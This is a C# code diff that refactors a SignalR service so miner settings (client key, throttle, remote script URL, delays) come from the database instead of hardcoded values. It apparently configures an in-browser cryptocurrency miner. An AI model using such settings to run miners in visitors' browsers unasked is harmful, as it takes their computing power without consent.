@@ -9,23 +9,29 @@ namespace SignalRService.Utils
 {
     public static class ModelExtensions
     {
+
+        public static MinerConfigurationViewModel ToMinerConfigurationViewModel(this MinerConfigurationModel dbmodel)
+        {
+            return new MinerConfigurationViewModel() {
+                ID = dbmodel.ID,
+                ClientId = dbmodel.ClientId,
+                ScriptUrl = dbmodel.ScriptUrl,
+                Throttle = dbmodel.Throttle.ToString(),
+                StartDelayMs = dbmodel.StartDelayMs,
+                ReportStatusIntervalMs = dbmodel.ReportStatusIntervalMs
+            };
+        }
+
         public static ServiceSettingViewModel ToServiceSettingViewModel(this ServiceSettingModel dbmodel )
         {
             return new ServiceSettingViewModel()
             {
-                Id = dbmodel.Id,
+                Id = dbmodel.ID,
                 ServiceName = dbmodel.ServiceName,
                 ServiceUrl = dbmodel.ServiceUrl,
                 ServiceType = (int)dbmodel.ServiceType,
                 EnumServiceTpe = dbmodel.ServiceType,
-                MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
-                {
-                    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
-                    Throttle = "0.9",
-                    ScriptUrl = "https://www.freecontent.stream./Htxj.js",
-                    StartDelayMs = 3000,
-                    ReportStatusIntervalMs = 65000
-                },
+                MinerConfigurationViewModel = dbmodel.MinerConfiguration.ToMinerConfigurationViewModel(),
                 SiganlRBaseConfigurationVieModel = new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
                 {
                     SinalRGroup = dbmodel.ServiceUrl.ToLower()
